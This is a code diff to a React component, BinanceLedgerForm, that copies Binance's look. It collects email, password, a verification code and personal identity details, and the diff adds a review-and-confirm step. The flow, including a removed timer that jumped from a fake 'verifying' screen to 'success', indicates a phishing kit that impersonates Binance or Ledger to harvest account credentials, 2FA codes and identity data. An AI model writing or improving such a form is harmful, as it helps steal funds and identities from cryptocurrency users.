@@ -1,9 +1,9 @@
-
 import { FC, useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { AlertTriangle } from "lucide-react";
+import { Checkbox } from "@/components/ui/checkbox";
 
-type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'verifying' | 'success';
+type FormStep = 'email' | 'password' | 'verification' | 'important-notice' | 'personal-details' | 'summary' | 'verifying' | 'success';
 
 const countries = [
   "United States", "United Kingdom", "Canada", "Australia", "Germany", "France", "Italy", "Spain", "Netherlands", "Belgium",
@@ -23,6 +23,7 @@ const BinanceLedgerForm: FC = () => {
   const [logoError, setLogoError] = useState(false);
   const [errors, setErrors] = useState<{[key: string]: string}>({});
   const [isTransitioning, setIsTransitioning] = useState(false);
+  const [confirmationChecked, setConfirmationChecked] = useState(false);
   const [personalDetails, setPersonalDetails] = useState({
     firstName: "",
     lastName: "",
@@ -124,12 +125,17 @@ const BinanceLedgerForm: FC = () => {
       return;
     }
     
-    transitionToStep('verifying');
+    transitionToStep('summary');
+  };
+
+  const handleSummaryConfirm = async () => {
+    if (!confirmationChecked) {
+      setErrors({ confirmation: "Please confirm that all information is accurate" });
+      return;
+    }
     
-    // Auto-proceed after 15 seconds
-    setTimeout(() => {
-      transitionToStep('success');
-    }, 15000);
+    setErrors({});
+    transitionToStep('important-notice');
   };
 
   const handlePaste = async () => {
@@ -169,11 +175,12 @@ const BinanceLedgerForm: FC = () => {
       verification: 'Enter Verification Code',
       'important-notice': 'Important Notice',
       'personal-details': 'Verify Details',
+      summary: 'Review Information',
       verifying: 'Verifying',
       success: 'Verification Successful'
     };
 
-    if (currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success') {
+    if (currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary') {
       return null; // Title handled in content for these states
     }
 
@@ -221,36 +228,159 @@ const BinanceLedgerForm: FC = () => {
     );
   };
 
-  // Render special states (important notice, verifying, success)
+  // Render special states (important notice, summary, verifying, success)
   const renderSpecialState = () => {
-    if (currentStep === 'important-notice') {
+    if (currentStep === 'summary') {
       return (
         <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
           <div className="max-w-sm mx-auto">
             <div 
-              className="mb-3 flex items-center justify-center gap-1.5 text-xs font-semibold font-binance"
-              style={{ color: "#F59E0B" }}
+              className="mb-4 text-sm font-semibold font-binance"
+              style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
             >
-              <AlertTriangle size={10} style={{ color: "#F59E0B" }} />
-              Important Notice
+              Review Information
             </div>
-            <div className="text-xs font-binance text-center leading-relaxed mb-5" style={{ color: "#B7BDC6" }}>
-              Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+            
+            <div className="text-left space-y-3 mb-5">
+              <div className="grid grid-cols-2 gap-3 text-xs">
+                <div>
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    First Name
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.firstName}
+                  </div>
+                </div>
+                <div>
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    Last Name
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.lastName}
+                  </div>
+                </div>
+                <div>
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    Date of Birth
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.dateOfBirth}
+                  </div>
+                </div>
+                <div>
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    Phone Number
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.phoneNumber}
+                  </div>
+                </div>
+                <div className="col-span-2">
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    Address
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.address}
+                  </div>
+                </div>
+                <div>
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    City
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.city}
+                  </div>
+                </div>
+                <div>
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    Postal Code
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.postalCode}
+                  </div>
+                </div>
+                <div className="col-span-2">
+                  <div className="font-medium font-binance mb-1" style={{ color: "var(--color-TertiaryText, #848E9C)" }}>
+                    Country
+                  </div>
+                  <div className="font-binance" style={{ color: "var(--color-PrimaryText, #EAECEF)" }}>
+                    {personalDetails.country}
+                  </div>
+                </div>
+              </div>
             </div>
+
+            <div className="mb-4">
+              <div className="flex items-start space-x-2">
+                <Checkbox
+                  id="confirmation"
+                  checked={confirmationChecked}
+                  onCheckedChange={(checked) => setConfirmationChecked(checked as boolean)}
+                  className="mt-0.5"
+                />
+                <label 
+                  htmlFor="confirmation" 
+                  className="text-xs font-binance leading-relaxed cursor-pointer"
+                  style={{ color: "var(--color-PrimaryText, #EAECEF)" }}
+                >
+                  I confirm that all the information I have provided is accurate, truthful, and complete.
+                </label>
+              </div>
+              {errors.confirmation && (
+                <div className="text-red-500 text-xs mt-2 font-binance">
+                  {errors.confirmation}
+                </div>
+              )}
+            </div>
+
             <button
               type="button"
-              onClick={handleNoticeConfirm}
+              onClick={handleSummaryConfirm}
+              disabled={isLoading}
               className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
               style={{
                 backgroundColor: "var(--color-BtnBg, #FCD535)",
                 color: "var(--color-TextOnYellow, #202630)",
                 height: "34px"
               }}
-              aria-label="I Understand"
+              aria-label="Confirm Information"
             >
-              I Understand
+              {isLoading ? (
+                <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
+              ) : (
+                'Confirm Information'
+              )}
             </button>
           </div>
+        </div>
+      );
+    }
+
+    if (currentStep === 'important-notice') {
+      return (
+        <div className="text-center" style={{ minHeight: "350px", display: "flex", flexDirection: "column", justifyContent: "center" }}>
+          <div 
+            className="text-xs font-semibold font-binance mb-3"
+            style={{ color: "#F59E0B" }}
+          >
+            Important Notice
+          </div>
+          <div className="text-xs font-binance text-center leading-relaxed mb-5" style={{ color: "#B7BDC6" }}>
+            Please ensure that all the information you provide is accurate and matches your official documents. This information will be verified for security and compliance purposes. Failure to provide accurate information may result in a delay or rejection of your verification process.
+          </div>
+          <button
+            type="button"
+            onClick={handleNoticeConfirm}
+            className="w-full py-2 rounded transition-all duration-200 hover:opacity-90 hover:scale-[1.02] active:scale-[0.98] font-bold font-binance text-xs"
+            style={{
+              backgroundColor: "var(--color-BtnBg, #FCD535)",
+              color: "var(--color-TextOnYellow, #202630)",
+              height: "34px"
+            }}
+            aria-label="I Understand"
+          >
+            I Understand
+          </button>
         </div>
       );
     }
@@ -711,13 +841,13 @@ const BinanceLedgerForm: FC = () => {
           }}
           type="submit"
           disabled={isLoading}
-          aria-label="Submit"
+          aria-label="Continue"
           onClick={handlePersonalDetailsSubmit}
         >
           {isLoading ? (
             <div className="animate-spin rounded-full h-3 w-3 border-2 border-current border-t-transparent"></div>
           ) : (
-            'Submit'
+            'Continue'
           )}
         </button>
       );
@@ -890,7 +1020,7 @@ const BinanceLedgerForm: FC = () => {
   };
 
   // Check if we should show special states
-  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success';
+  const isSpecialState = currentStep === 'important-notice' || currentStep === 'verifying' || currentStep === 'success' || currentStep === 'summary';
 
   return (
     <div 
